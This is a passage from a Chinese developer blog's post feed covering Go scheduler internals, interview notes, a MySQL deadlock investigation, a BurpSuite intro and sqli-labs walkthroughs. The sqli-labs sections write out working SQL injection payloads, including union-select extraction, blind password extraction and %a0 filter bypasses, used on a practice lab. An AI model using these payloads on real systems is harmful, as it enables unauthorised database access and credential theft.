首先是，没有标记sysretake，也就是没有超时，那就随它去。如果p队列为空，而且没超过一定时长（pd.syscallwhen+10*1000*1000），那也暂时不管。中间的spinning状态和idle不提。\n确定是同步系统调用中，而且无法被抢占，这里就要提到Go的调度策略之 handoff，注意倒数第五行的handoffp(_p_)。\nhandoffp 在 P 队列里还有任务的时候，会调度一个空闲的 M（或者创建一个）绑定 P，继续执行。\nsysmon和netpoll 在 sysmon 中还有一段关于网络netpoll的代码。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  if netpollinited() \u0026amp;\u0026amp; lastpoll != 0 \u0026amp;\u0026amp; lastpoll+10*1000*1000 \u0026lt; now { atomic.Cas64(\u0026amp;sched.lastpoll, uint64(lastpoll), uint64(now)) list := netpoll(0) // non-blocking - returns list of goroutines  if !list.empty() { // Need to decrement number of idle locked M\u0026#39;s  // (pretending that one more is running) before injectglist.  // Otherwise it can lead to the following situation:  // injectglist grabs all P\u0026#39;s but before it starts M\u0026#39;s to run the P\u0026#39;s,  // another M returns from syscall, finishes running its G,  // observes that there is no work to do and no other running M\u0026#39;s  // and reports deadlock.  incidlelocked(-1) injectglist(\u0026amp;list) incidlelocked(1) } }   sysmon检查到有可用的连接后（netpoll返回的list），将可用的G加入可运行的队列（这里是sysmon这个特殊M，没有P，所以是加入全局队列）。\nwork stealing 回到Go程序启动时我们看到的schedule函数，里面调用了findRunnable这个工具函数来获取可用的任务。注释里写的很清楚。\n 1 2 3 4  // Finds a runnable goroutine to execute. // Tries to steal from other P\u0026#39;s, get g from local or global queue, poll network. // tryWakeP indicates that the returned goroutine is not normal (GC worker, trace // reader) so the caller should try to wake a P.    我们看下内部怎么工作的。\n1 2 3 4 5 6 7 8 9 10 11  // Check the global runnable queue once in a while to ensure fairness. // Otherwise two goroutines can completely occupy the local runqueue // by constantly respawning each other. if _p_.schedtick%61 == 0 \u0026amp;\u0026amp; sched.runqsize \u0026gt; 0 { lock(\u0026amp;sched.lock) gp = globrunqget(_p_, 1) unlock(\u0026amp;sched.lock) if gp != nil { return gp, false, false } }   首先，如果队列非空而且已经跑本地队列一段时间了（schedtick%61==0），会尝试从全局队列取一半的G到本地队列运行（globrunqget），保证公平调度，防止全局队列的G饿死。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  // local runq if gp, inheritTime := runqget(_p_); gp != nil { return gp, inheritTime, false } // global runq if sched.runqsize != 0 { lock(\u0026amp;sched.lock) gp := globrunqget(_p_, 0) unlock(\u0026amp;sched.lock) if gp != nil { return gp, false, false } }   接着先后尝试从本地队列和全局队列取G，如果本地队列没有任务，全局队列也没有了，再从其他地方找。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  // Poll network. // This netpoll is only an optimization before we resort to stealing. // We can safely skip it if there are no waiters or a thread is blocked // in netpoll already. If there is any kind of logical race with that // blocked thread (e.g. it has already returned from netpoll, but does // not set lastpoll yet), this thread will do blocking netpoll below // anyway. if netpollinited() \u0026amp;\u0026amp; atomic.Load(\u0026amp;netpollWaiters) \u0026gt; 0 \u0026amp;\u0026amp; atomic.Load64(\u0026amp;sched.lastpoll) != 0 { if list := netpoll(0); !list.empty() { // non-blocking  gp := list.pop() injectglist(\u0026amp;list) casgstatus(gp, _Gwaiting, _Grunnable) if trace.enabled { traceGoUnpark(gp, 0) } return gp, false, false } }   尝试过一次netpoll找出就绪的G。还是没有，尝试从其他P 偷 G来执行。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  // Spinning Ms: steal work from other Ps. // // Limit the number of spinning Ms to half the number of busy Ps. // This is necessary to prevent excessive CPU consumption when // GOMAXPROCS\u0026gt;\u0026gt;1 but the program parallelism is low. procs := uint32(gomaxprocs) if _g_.m.spinning || 2*atomic.Load(\u0026amp;sched.nmspinning) \u0026lt; procs-atomic.Load(\u0026amp;sched.npidle) { gp, inheritTime, tnow, w, newWork := stealWork(now) now = tnow if gp != nil { // Successfully stole.  return gp, inheritTime, false } }   stealWork会尝试从其他P偷一半G到自己的P的本地队列里。\ngoroutine的启动 简而言之，go f()其实就是runtime.newproc(f)，newproc的实现逻辑就是把函数包装成G结构，加入当前P的本地队列，仅此而已。之后就是正常调度。\n普通M的启动 runtime.newm函数。m会分配到堆上（allocm），加入allm全局M池，在newm里调用了newm1，newm1里使用newosproc启动了一个操作系统线程来运行创建的M。看注释还有一种做法是 template thread，用于处理 locked M或者被 C 代码启动的情况。\n总结 又是有些突兀的结束。\n关于runtime其实还是有不少好玩的东西的，但问题就是不太好拿调试器去跟，现在也没看到什么特别好的go源码解读的文章或者书本吧。\nGo 官方自己在 release note 里说过，不要依赖调度器的行为。GMP 学一学，看看 runtime 里怎么实现的，都挺好的。我是说，出于兴趣，那都挺好的。学到就是赚到，就算写代码的时候用不上也可以当谈资。\n但应付面试的话=。=我感觉对照着八股文知识点去翻一下 runtime 对应的代码其实也就差不多了，甚至翻都不用翻，背呗。就是没乐趣了。\n这篇博客主要是加强八股，所以GMP的知识点浅尝辄止吧。时间有限，八股说每个 M 创建都有个 g0 ，但还没在代码里找到哪儿给新 M 设置的 g0；scavenger 也没看，记得第一次翻 go 源码就是为了找出 scavenger 到底怎么向 os 返还内存，现在也没结论。剩下的问题太多了。\n就这样吧，结束，辛苦自己了。\n","date":"2022-05-31T16:14:47+08:00","permalink":"https://nnnewb.github.io/blog/p/go-interview-question-gmp-model/","title":"Go面试八股之GMP模型"},{"content":"前言 面试完，结果只能说我对自己也不算很满意，顺带反思了一下是不是表现得太着急了。\n原本以为一个小时足矣，结果面到快12点，才结束完面试，还没出门就碰到泼水一样的暴雨。花了一个多钟头到家，已经是下午1点十几分了。原本打算去公司继续上下午的班，但累到没有一点心情，于是把上午的假延长到下午。\ntypora 建好文件后就着住房改造家的视频吃了午饭，再看会儿 boss 上的的 jd ，还是劝自己把面试的复盘写完，迟早都是要写的。\n技术面 开场技术面，自我介绍、关于离职原因一类的问题就略了。我不记得所有问题，所以就单独把还有映像的问题拿出来复盘下。鉴于我技术栈两门语言，面试官 Python 和 Go 的题混合问的，我回忆的顺序大概也对不上实际面试中问的顺序。\n简答题 深浅拷贝 基础题。复盘中自我感觉回答应该没什么遗漏，但沟通中感觉和面试官就 拷贝 意指 a=b 还是 a=list(b) 有点误会，但总之问题不大。\n哈希冲突、哈希表时间复杂度、哈希表实现、dict是不是哈希表 简单的算法和一点CPython实现细节。\n哈希冲突实质是摘要函数输入空间和输出空间不对等，冲突无法避免。\n哈希表的时间复杂度是 O(1) ，面试官还问了为什么是 O(1)，emm，我的回答是直接拿哈希值当索引的情况下空间换时间，最理想的情况一条指令就能取到元素了。回答不太准，问了下谷歌说是最坏O(n)，平均O1。显然最坏的情况就是碰撞了。\n哈希表实现的话，当时没敢答。现在想想的话，在 leetcode 做过相关的题，简单的实现比如把ascii码表（或者随便什么序列）映射到一块连续内存上然后就能直接去索引了，复杂的实现问谷歌回答是 Java 的 HashMap 是红黑树实现，Go 的 map 也是哈希表，但实现也不是我说的那种直接映射到一块内存上。总之就是各有不同吧。\ndict 底层也是哈希表，下次记得问 map/dict 都回答哈希表就是了。\n具体 Go 和 Python 的实现抽时间再找解析看看，不行就硬读源码了。\n并发和并行 可能是几年前看过，但当时印象不深，太偏理论了，实践中很少能碰到抠这俩字眼的情况。重温下。\n并发是 concurrent，并行是 parallel ，有个比较形象的说法是并发是同一时间发生几件事，并行是这几件事同时发生。\n放到操作系统原理来解释就是并发可以是单核CPU给两个进程都分了时间片，所以 看起来 两者同时执行，但实际上两者还是有先后，或者交错进行的。并行就是多核 CPU 同时在跑两个进程的代码，两个程序是真的同时处于运行状态。\nGIL 基础题。我当时回答是执行字节码的时候加的锁，确保同时只有一个线程在执行字节码，目的是简化编程，后来因为各种原因就变成了历史遗留，各种去除GIL改成细粒度锁的尝试目前还没有很好的结果。\n特地回顾了下python文档，确定了文档的说法和我记忆中是一样的。\n但感觉面试官不太满意的样子…为啥呢。\nGMP 基础题。但没背八股，照着映像乱讲一通了。\nG就是goroutine，M是操作系统线程，P是处理器。好像也有管P叫管理器。\n整个模型就是 M 绑定 P，M 有个 G 队列，然后就是抢占式调度。\n 2022年5月30日 订正\n这里我的理解是错的，参考下面这图\nP 维护队列，M 绑定 P 运行 G，当 G 阻塞的时候视阻塞类型放到 netpoller 里，或者sysmon标记成可以被抢占，或者把 G 和 M 分出去（解绑P），让其他 M 绑定 P 继续处理其他 G 。\n 要说遗漏的内容的话 emm\n GMP 还有个全局 G 队列 work stealing：M 在没有任务的时候会抢其他 M 队列里的 G 去调度 hand off：M 阻塞的时候会释放 P，让其他线程跑。（不太理解） P 数量不一定对应物理核心或者逻辑核心数量，可以调。 M 是 Go runtime 阻塞的时候自动创建新的，有上限。 M0 和 G0  漏的东西还挺多的。因为面 Python 都忘了要看下 Go 的经典八股。\nGC 基础题。Go的 GC 是从 Mark-Sweep 到三色标记算法（黑白灰），面试中具体的算法内容没提。还提到Go的内存返还机制，但没表达清楚。MADV_FREE 的坑也没提。\n混合写屏障 GC进阶一点的题？面试时没答上来。讲真应该把Go的八股先看看的…\n写屏障是一个无STW场景才存在的问题，STW的话就不会在扫描的时候有谁在写了。写屏障是为了解决扫描的时候有人在写对象的问题，避免三色标记错误。\n混合写屏障是混合了两种写屏障算法（ Dijkstra 插入屏障和 Yuasa 删除屏障）。\n具体的我先放个链接在这里吧=。=\n懒得抄一遍。\n 写屏障技术 - Go语言原本 Golang 三色标记、混合写屏障GC模式图文全分析  InnoDB 数据库题。问题有点宽泛到摸不着头脑，但真要我介绍下 InnoDB 是个啥有啥特性我也真说不上来。\n先留个链接等之后再细读。\n mysql 5.7 innodb introduction 《MySQL技术内幕（InnoDB引擎）》  面试官居然问你们不用MySQL的吗…我…\n行吧……\n简直是暴击。\ndocker隔离原理 基础题吧。\n基本原理就是利用内核的 namespace 隔离了 pid、mount、network，chroot 隔离了文件系统，cgroup 控制资源使用。\n面试的时候忘记了一个 UTS ，就是隔离 hostname ，还有 IPC，还有 USER 。另外就是 cgroup 也是有 namespace 的。\n具体可以看 unshare，直接 man unshare 就行。\n论述题 python给函数加超时装饰器 面试的时候回答是async def 可以直接用 future 实现。普通函数可以用线程，完成后信号量统治下调用方。当时就中途返回的问题拉扯了一下，感觉还是没讲清楚。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40  import threading from time import sleep def timeout(seconds: float): def wrapper(f): def wrapped(*args, **kwargs): # 构造一个 0 信号量 s = threading.Semaphore(0) result = None # 包装一下，任务完成时返回结果并发出完成信号 def _f(sem: threading.Semaphore): nonlocal result result = f(*args, **kwargs) sem.release(1) t = threading.Thread(target=lambda: _f(s)) t.start() # acquire 会把信号量 -1 ，不满足时等待，这里利用了 acquire 自带的 timeout 参数 # 如果问到更底层的话比如C/C++甚至汇编，可能要依赖OS功能（信号机制之类的）来唤醒，大概这样。 if s.acquire(timeout=seconds) is False: raise Exception(\u0026#39;timeout\u0026#39;) return result return wrapped return wrapper if __name__ == \u0026#39;__main__\u0026#39;: @timeout(3.0) def f(seconds): print(seconds) sleep(seconds) return \u0026#39;hahaha\u0026#39; print(f(1.0)) print(f(2.0)) print(f(3.0))   这就是我说的信号量解法。但面试官后来又问是不是每个装饰器都要一个信号量，我猜面试官对这个解还不满意。\n不使用信号量也能实现，但无论如何这个等待和唤醒要依赖一个异步通知机制，总是没法避免。\n分离到另一个线程里执行也是个比较头疼的做法，但面试那儿会想不出更好的主意。\n三个goroutine循环输出abc 面试的时候下意识回答用mutex，但拿纸笔整理了下思路，改成了用chan感觉更好。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25  package main import \u0026#34;sync\u0026#34; func main() { a, b, c := make(chan struct{}, 1), make(chan struct{}, 1), make(chan struct{}, 1) wg := \u0026amp;sync.WaitGroup{} wg.Add(3) go f(\u0026#34;a\u0026#34;, a, b, wg) go f(\u0026#34;b\u0026#34;, b, c, wg) go f(\u0026#34;c\u0026#34;, c, a, wg) a \u0026lt;- struct{}{} wg.Wait() } func f(s string, in, out chan struct{}, wg *sync.WaitGroup) { defer wg.Done() for i := 0; i \u0026lt; 5; i++ { _ = \u0026lt;-in print(s) out \u0026lt;- struct{}{} } } // abcabcabcabcabc   面试官还问到是不是无buffer的 chan，我说是1 。当时没想那么多，实际分析代码会发现必须是1，不能是无缓冲的，因为循环末尾c会再发信号给a，而那时候a已经退出了，无缓冲的情况下c会阻塞死，会报错 all goroutines are asleep 。但1缓冲就不会有这个问题。\n分布式追踪架构和实现（侵入/非侵入） 这个主要是吹逼。\n讲了下分布式追踪基本的架构，也就是从 Agent 到 Collector 再到存储，然后前端从存储查数据展示，基本数据结构 Span 啦什么的。\n面试官还问能不能非侵入，非侵入和侵入有什么区别，这部分就是吹水了。侵入的话自然是什么都能做，把分布式追踪当日志用。非侵入的话就是外面挂 sidecar，代理流量，也能拿到 RPC 调用、HTTP请求之类的数据，举例就是服务网格。当然还有 pprof 也能拿到一些统计数据但那个是时序性的，应该叫 metrics ，和追踪又不太一样。\n但后来发现和面试官理解有点偏差，面试官只想不侵入业务代码，但应用代码是可以侵入的，那就好办多了。不管是 sql.driver 还是自定义 logger 都行，很多组件都支持插中间件，这种情况下基本和侵入业务代码差不多了，除了一些更细致的像是统计某个循环跑了多久之类的还需要单独写 span 办不到之外（要是封装个timeit之类的也不算侵入的话那就0限制了，想干啥都行）。\nUPV 登录界面几个接口 面试官画了个图问这界面要几个后端接口。\nU是用户名，P是密码，V是验证码。\n我的回答是2~3个，看验证码刷新要不要单独给个接口。\n然后又问你会怎么实现这个登录接口。\nemm，感觉题有点怪，想考察思维全面不全面？答了几个点：\n 密码加盐哈希，一般就直接 HMAC SESSION_ID 取正确验证码来验证 给 ratelimit，验证码刷新和登录尝试都要限 CSRF Token，可以是直接从服务端返回（服务端渲染）或者Ajax 拿到  现在的话想起来几个新的点\n 用户量很大的话查数据库压力太大，可以加一层缓存，验证密码的时候不访问数据库了 错误信息控制，防止爆破用户名 响应时间控制，防止 Timing Attack （虽然可能性真的很低，但结合下数据库压力，能让走数据库和不走数据库的请求有明显时间差异的话还是可能爆出用户名的，感觉是非常极端的情况了） 前后端分离的情况下前端单独nginx部署肯定是没有后端返回的会话ID或者验证码ID什么的，这种情况下会话标识、CSRF Token 都只能 Ajax 拿。最近PHP看多了感觉思路在往后端渲染跑。前后端分离最少也要2个接口，CSRF、验证码+验证码ID（或者会话ID，总之要把登录请求和验证码联系起来）  总结 薄弱点基本确定了。\n一个是Go方面，八股背熟真的有用。\n另一个是MySQL，一方面是需要切实再深入一下，另外MySQL的八股也得找找。\n虽然面完让我有点幻灭的感觉，安全行业不止卷还抠=。=\n虽然让我等联系，但估计也没下文了。骑驴找马还得继续。\n","date":"2022-05-27T18:33:00+08:00","permalink":"https://nnnewb.github.io/blog/p/2022-05-27-interview-note/","title":"2022年5月27日 面试记录"},{"content":"分享下喜讯，倒不是找到女朋友了，而是投简历三天终于约到了第一个面试。虽然和最初期待的安全方向有点偏差，没面到渗透测试的岗位，但薪资能涨点的话还是挺不错的。\n不过往安全行业继续探索的想法暂时还没变，互联网别的行业兴趣确实不大，非互联网的做软件我是真的担心项目管理的水平行不行，全看团队合不合得来，越做越糟心，还不如一开始就拒绝。安全还算有一点兴趣，不管是干开发还是做安服起码都还是技术岗，营收靠技术起码保证能活下来的公司技术管理上不会太糊吧。我希望是这样。\n另外一个重大问题就是学历、证书、开源项目（技术文章）三个重大问题，学历有望解决，别的证书主要是烧钱。学历和证书都要时间，所以如果看对眼的话期望工作之余能顺利拿到学位证，再看情况考个 CISP 之类的证（emm，但看起来渗透测试月薪开得比较低，不值一个 CISP-PTE 这样要几个w 的证，安全开发职位看起来并不是很多）。\n开源项目和技术文章质量还得提高，开源项目目前的问题是没找到适合的参与，自己写也没有方向。技术文章受限于自己水平有限，写起来基本是一边做一边写，时不时发现自己理解有误又改一下，最后产出乱七八糟的，感觉远没有那些精品文章写得好。这个没啥好主意，练呗。\n就这样啦，开心一下。\n","date":"2022-05-25T16:18:52+08:00","permalink":"https://nnnewb.github.io/blog/p/good-thing-happens-2022-5-25/","title":"好事儿来乐"},{"content":"前言 并不是 MySQL 的死锁检测报错，而是一个业务代码架构上的问题导致的死锁。MySQL 只报了 Error 1205: Lock wait timeout exceeded; try restarting transaction 。\n感觉还是值得一谈的。\n现象 客户端每天第一次点评的时候响应速度极慢，从半分钟到一分钟不等。一开始测试跟我说这问题复现不出来，我暂时就没管。\n第二天测试告诉我稳定复现了，第一次点评一定这么慢，于是要了客户端的日志，拿到请求 ID 后开始看跟踪情况。\n排查 代码审阅和整理 查看源码，初步断定是一个 每日点评奖励经验值 的业务里调用了这个 AddExperience RPC 函数，因为 MySQL 错误提示是明确指出锁等待超时，所以还得看一眼 AddExperience 这个 RPC 函数里涉事的 SQL 语句。\n1  insertuser(experience,user_id)values(if(?\u0026gt;0,?,0),?)ONDUPLICATEKEYUPDATEexperience=if(?\u0026gt;0,experience+?,experience)  好了，可以开始笑了。不要问我为什么这样写，又不是我写的\u0026hellip;\u0026hellip; 问了写下这句SQL的同事想做什么，回答就不放了，总之和这句 SQL 的实际干的事没什么关系。\n基于奥卡姆剃刀原理先把这句 insert on duplicate 改成平平无奇的 update ，发现问题依然存在。\n死锁来源 回到错误信息，Lock wait timeout exceeded，锁的是什么？从上面爆出错误的SQL看出应该是锁了 user 表，但不确定具体锁类型。\n问题就变成了，谁加的锁？因为故障能稳定复现，开发环境几乎没有负载，也就是几乎不可能因为其他请求造成死锁，加锁者就在这个请求内。\n于是重新纵览整个请求流程涉事的 SQL 语句，注意到几点：\n 因为一些历史原因，涉事的 RPC 尚无分布式事务支持。 请求 RPC 时，事务还没提交。  基本确认来源是事务内。排查发现并没有直接 select ... from user 这样的 SQL，但注意到有表和user表存在外键关联，涉事SQL是insert into。\n查询MySQL文档没有收获（关于insert是否会锁外键的问题），但谷歌发现stackoverflow 上已有相同的问题，答案是 yes，会在记录上加共享锁。\n至此，死锁来源基本算查明了。\n解决和预防 解决方案 处理说简单其实是简单的，把加经验的SQL挪到事务里就完事了，事实上也是这么解决的（如果看过之前我吐槽这项目的博客的话就会知道这项目就是农村无人管理的露天茅厕，矢上雕花大可不必）。\n预防 微服务架构为什么要分库？在遇到这个问题前我也没什么直观的感受，大约是出于性能和扩展性的考量。但遇到这问题后我可以再补充个回答了：防呆。\n在软件工程里怎么防止引入低质量代码有很多解决方法，比如机检、人工审阅、技术方案提前做设计评审、测试全覆盖等等，往大了说，可以再挑个阵营：TDD、DDD什么的，指导架构设计。尽量遵循最佳实践不要把坑再踩一遍诸如此类。学历史也不用从猿人扮演开始吧？\n但真的很难避免一个已经很复杂的业务里引入一个看似简单的功能，结果因为架构上挖的坑导致产生难以排查的故障。\n扯远了。这个问题预防说简单也简单，遵循最佳实践，该分库分库，加强代码审阅，提高意识巴拉巴拉。但凡能做到一点也不至于把这项目变成露天粪坑。总之，怎么给服务定好边界在最初的开发过程里就是最重要的问题。边界都不清晰，你中有我我中有你就别整什么微服务了。\n架构设计上总是脱不开那句“高内聚、低耦合”，微服务的优势就在单个服务的独立性，可以独立开发、独立维护，不用对整个系统有深入了解。用了微服务，又不在服务间划清界限，用单体应用的思路一把梭写完再分成几个可执行文件，不出问题才是真的怪事，既不内聚又高耦合，还不如就写个单体应用，起码不用调试和部署的时候都跟吃了矢一样。\n总结 顺便再一说，这项目现在还在同时用 sql 和 xorm，所以一个不小心，接口交叉使用了两个事务，还是会死锁。\n越写越烦躁。先这样吧。\n","date":"2022-05-25T10:21:12+08:00","image":"https://nnnewb.github.io/blog/p/a-mysql-deadlock-investigation/pankaj-patel-Fi-GJaLRGKc-unsplash_hu54d45def1a288887897b72824d269a44_887498_120x120_fill_q75_box_smart1.jpg","permalink":"https://nnnewb.github.io/blog/p/a-mysql-deadlock-investigation/","title":"一个MySQL死锁问题排查"},{"content":"前言 因为一些不可抗力因素，不得不提前准备换工作事宜了。\n早上尝试投了两家安全方向的企业，但目前还没有好消息传来。于是根据招聘App上看到各个企业招渗透测试给出的技术栈要求，决定下一步是对技术外的两个方面初步挖掘下。\n一是工具掌握上，不知道是HR懒喜欢从别人公司的招聘要求上复制还是技术负责人确实在乎，反正大部分要求上都写要熟悉 BurpSuite、MSF 之类的玩意儿。这方面确实有欠缺，工具到现在还只在靶场用过 sqlmap，所以接下来计划熟悉下 BurpSuite 和 MSF，也看看 Kali Linux 这个常常和 script kid 联系起来的发行版有啥东西可以玩玩看。\n二是行业内的法律规范和工作流程、测试报告写法之类的内容。目前看起来做乙方的公司对合规性还是普遍比较重视的。\n技能树 目前这个技能树做得很粗糙，基本是靠映像捋了下。绿色是有针对性学过或者实践过，标成绿色的技能水平其实并不太一样。黄色是没有针对性学过的，但同样不代表完全不了解，比如 gdb 是写c/c++的老朋友了=。=但我从没有在 pwn 或者逆向之类的场景里用过 gdb ，所以还是标黄。nmap也用过，扫自己的路由器还有找不到树莓派的IP的时候扫网段什么的，但也没拿 nmap 做过渗透前信息收集之类的事情。\n技能集中在 Web 领域，大概是入门的水平，反序列化漏洞还没有系统学过算是个知识漏洞。逆向领域因为之前研究加壳脱壳的缘故，也算是有入门的水准吧。正经 CTF 可能不太行，但52破解的 2022 新年 CTF 还是把中级题做出来了的（但正好那几天没时间，实际上只提交了初级题的flag，中级题做出来的时候已经连题解都有了）。\n另外一个实际缺陷是没有真正重现和分析 CVE/CNVD 的经验，靶场练习有点纸上谈兵的意思。\n大概就是这样，接着开始说 BurpSuite。\nBurpSuite 总览 BurpSuite 是个 Portswigger 出品的渗透测试工具。我直接说我的看法，BurpSuite 其实是一个中间人，类似 mitmporxy 或者 fiddler 的中间人代理工具，但集成了很多渗透测试领域实用的功能。但本体上给我的初步映像是这就是个 proxy。\n功能 信息收集一类的工作有下面几个模块\n Burp Target 搜集站点信息如站点地图等 Burp Spider 顾名思义爬虫，更深一步了解全站 Burp Scanner 漏洞扫描工具  执行攻击，比如枚举用户名之类的工作\n Burp Intruder 尝试在不同位置带 payload 发起攻击 Burp Repeater 请求重放 Burp Sequencer 数据样本随机性质量检测，或者说随机数分析，找规律的工具  以及一些其他工具\n Burp Decoder Burp Comparer  顾名思义了。\n实验 interceptor 一个简单的实验，用 BurpSuite 完成 DVWA 盲注。试用上面这些模块。\n首先是 proxy 模块里的 interceptor 功能，顾名思义，拦截 HTTP 请求，可以在 burpsuite 里编辑请求和响应，选择转发还是丢弃。\n需要注意响应拦截器默认不是开启状态。\nsitemap 通过 proxy 随便拦一个请求下来之后就可以在 Target 里看到目标域名的站点地图了。\n侧边栏里大部分结果应该是从网页里爬出来的链接，并不是实际执行了请求。我们打开盲注题随便请求一次后，burpsuite里就记录下了相关的信息。\n这个齿轮图标表示能接收参数（可配置？）。邮件图标表示是 POST 方法。\nintruder 在齿轮或者右键图标这一行记录上右键，发送到 intruder ，然后就可以在 intruder 里配置扫描方式了。\nattack type 是怎么组织攻击 payload，比如 sniper 类型会把 payload 按顺序放到 payload positions 里定义的位置；再比如 batteies ram 会迭代 payload ，把同一个 payload 放到所有位置上。\n在 payloads tab 页里可以配置 payload 类型什么的。\n这里我打算测一下有多少id可用，所以改成了 numbers 类型，范围1~99，约束格式为10进制数，无小数，1~2位。接着 start attack 看看 BurpSuite 会怎么做。\n注意到长度在 0~5 都是 4610，后续都是4616。点击其中的条目可以看到具体的请求和响应数据。一个特例是请求0发送的id=1，此时是payload position里定义的位置原始的参数。之后请求1开始就是intruder生成的了。\n显然 intruder 还可以有很多玩法，比如自己指定一个 payload 集合去跑。intruder 也内置了 brute force 之类的 payload 集合，可以省点写脚本的时间。\n总结 有点突兀是吧？暂且先写到这里。本来想看看 BurpSuite 的 scan 模块，但不清楚是 temporary project 的原因还是 community edition 就不支持，反正 new scan 这个按钮是灰的。\n投了两家安全方向的厂商没什么结果，现在突如其来一堆事情搞得烦不胜烦。马原的网课才看了四分之三，找工作开始两天一个面试邀约也没有，身体上又有新毛病，膝盖疼起来了\u0026hellip;..都不知道是不是有痛风的因素，就连脑子这两天都有点昏昏沉沉的。\n博客虽然想保持高频率更新，但抵不过真的很烦心。除了叹气都不知道还有什么可说的。这么短一篇博客还写了两天。\n记得刚面这家公司的时候就提过，不想再一年一跳了，能忍则忍，怎么就混成现在这样子了，才两年而已。越是想，越是从生气变成沮丧。难道真的是我不配。\n就先这样吧，收拾收拾。先保持骑驴找马的状态。\n","date":"2022-05-24T14:48:22+08:00","image":"https://nnnewb.github.io/blog/p/get-start-burpsuite-and-my-skill-tree/clement-helardot-95YRwf6CNw8-unsplash_hucfaba9479047c85853a2baba76ce1de3_2057374_120x120_fill_q75_box_smart1.jpg","permalink":"https://nnnewb.github.io/blog/p/get-start-burpsuite-and-my-skill-tree/","title":"BurpSuite 入门和正在做的技能树"},{"content":" 图片来自 unsplash.com，图文无关。\n 周一的上午是惯例的摸鱼时间。\n项目依然是半死不活的样子，前端大量的 bug 待修，后端要么没事要么就是异想天开的麻烦事。或者修两个小 bug。说是上线了生产环境，但看起来没人有这个意识，线上也没有什么可观察性基础设施。\n所以就这样了，对我来说这个项目就是一潭死水了。\n看了看时间，现在是 2022 年 5 月了，记忆里还残存着电视里 2008 年奥运会的盛景，初高中那会儿愣头青干的蠢事，想想就连在入行以来第一份工作里说的蠢话干的蠢事都像是很久以前发生的事情了。\n算算年龄，然后周期性地恐慌：离30岁还有6、5、4、3\u0026hellip;.年。哦，我的恐慌周期还要短一点，应该是\u0026hellip;N年零M个月，以此类推。\n昨天晚上从书架底下的纸箱里翻出一副旧耳机，映像里最初是在18还是19年入手，用了一年不到陶瓷壳就碎了，于是过了段时间又买了同款。昨晚翻出来的这幅当然是后来买的同款。记得最后一次用这幅耳机应该是20年的事情，现在戴上这幅耳机，感觉就像是回到了过去，刚入职这家公司的那会儿。\n又在说蠢话了。\n不知道什么时候开始，对敲代码的执念逐渐放松，而现在渐渐接近消逝了。回首过去，我是个爱幻想的孩子，有些过于沉溺于那些奇幻瑰丽的脑内世界。我也曾经相信敲代码能改变什么，与人工智能共赴什么。我也尝试把这些幻想分享给更多人，但总而言之，很遗憾。\n过去的一切造就了现在的我。\n这两天广州的雨未停歇，7点清晨的雨滴落在掌心，渗透到我的内里。浸润，浸润。\n","date":"2022-05-16T10:28:00+08:00","image":"https://nnnewb.github.io/blog/p/2022-05-16-rain/geetanjal-khanna-8CwoHpZe3qE-unsplash_huc91edc65b707447a73f3c0bc82a0cf99_1398098_120x120_fill_q75_box_smart1.jpg","permalink":"https://nnnewb.github.io/blog/p/2022-05-16-rain/","title":"雨"},{"content":"前言 惯例。\n随便刷两题。\nLess-28 没有错误回显，有查询结果。提示 all your \u0026lsquo;union\u0026rsquo; and \u0026lsquo;select\u0026rsquo; belongs to us ，和 27 一样的提示，不同的是 union 和 select 加了引号。不知道想表达什么。\n验证注入类型 ?id=1' and '1'='1 + ?id=1' and '1'='0 确定是字符型注入，单引号。注意服务端可能有个类型转换导致 1 and 1=1 这样的 payload 也有回显，通过构造为假的条件可以发现并不是数字型注入。\n从提示看是过滤了 union 和 select 但不知道怎么过滤的，尝试双写 bypass，发现空格被过滤了。\n尝试/**/替换空格 bypass ，发现依然无效。\n尝试 0xa0 替换空格。\n看起来ok了，但看起来完全没过滤 union 和 select ，把双写去除后重试，依然没有回显，茫然。\n好吧，重新整理思路。先测试下过滤了什么东西 ?id=0'\u0026quot;;--%23/**/union,select\n注意到只剩下了 '\u0026quot;; 幸存，前面有个双写和%a0union%a0没被替换，所以初步怀疑正则可能是\\b(union|select)\\b。尝试大小写也被过滤了，所以正则匹配应该还有个 i 标志。\n这种情况我有个思路是走盲注，用AND IF(...)爆破。尝试?id=1'%a0and%a0if(ascii(substring(password,1,1))\u0026gt;0,true,false)%a0and%a0'1'='1 有回显，条件改成\u0026lt;0则无回显。继续爆破即可。\n再给其他人的思路参考：\n 审阅代码可知正则并不是我猜测的\\b(union|select)\\b，而是union\\s+select，因此可以被%a0绕过，正常union select 或者 union all select 可破。  Less-29 提示 protection with WAF, this site protected by world\u0026rsquo;s best firewall.\n测试过滤了什么东西。?id=1'\u0026quot;;--%23/**/%20select,union,and,or,SeLect,UniOn,seselectlect,uniunionon\n发现什么都没过滤，看起来是单引号字符型注入。尝试 Less-28 的盲注 payload 发现成功。什么鬼？\n尝试 ?id=0' union select 1,version(),database() --%20 发现也直接成功。\nWAF，看看你都保护了个啥。\nWAF设置 经查，原来是我挑的这个分支 docker-compose 部署有问题=。=\nWAF 并不属于 PHP，而是 jsp 的，在仓库目录下有个 tomcat.zip 保存了 WAF 的内容，需要单独部署。\n参考sqli-labs: Less-29 - Less-31 这篇文章了解到架构大体上就是 tomcat 过滤参数后反代 apache 服务，但仔细看了下 WAF 内容发现没有对 Less-29~Less-32 之外的页面反代，导致把 tomcat 挂在 80 端口的话就访问不到其他没设置 WAF 的页面。\n合理的架构应该是这样。\n修改 docker-compose.yaml 如下\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44  version:\u0026#39;3\u0026#39;services:reverseproxy:image:\u0026#34;nginx:mainline\u0026#34;depends_on:- web- wafports:- 80:80links:- web:web- waf:wafvolumes:- \u0026#34;./etc/nginx_default.conf:/etc/nginx/conf.d/default.conf\u0026#34;db:image:\u0026#34;mysql:5.7.33\u0026#34;environment:MYSQL_ROOT_PASSWORD:toorMYSQL_ROOT_HOST:\u0026#34;%\u0026#34;ports:- 3306:3306web:depends_on:- dbimage:\u0026#34;php:5.3-apache\u0026#34;volumes:- 